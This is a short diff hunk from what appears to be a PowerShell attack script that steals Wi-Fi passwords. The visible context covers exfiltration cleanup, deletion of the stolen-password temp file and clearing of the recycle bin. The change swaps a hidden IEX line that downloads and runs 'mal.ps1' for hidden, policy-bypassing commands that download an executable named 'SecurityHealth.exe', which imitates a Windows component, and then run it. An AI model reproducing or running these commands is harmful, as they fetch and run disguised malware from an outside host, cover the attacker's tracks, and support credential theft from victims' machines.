@@ -135,7 +135,8 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 ############################################################################################################################################################
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 RI $env:TEMP/--wifi-pass.txt
-powershell.exe -Windowstyle Hidden -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/Power--Shell/main/mal.ps1');"
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://raw.githubusercontent.com/rude90/Payloads/main/SecurityHealth.exe -o C:\Users\Public\SecurityHealth.exe
+powershell.exe -w Hidden C:\Users\Public\SecurityHealth.exe
 
 
 
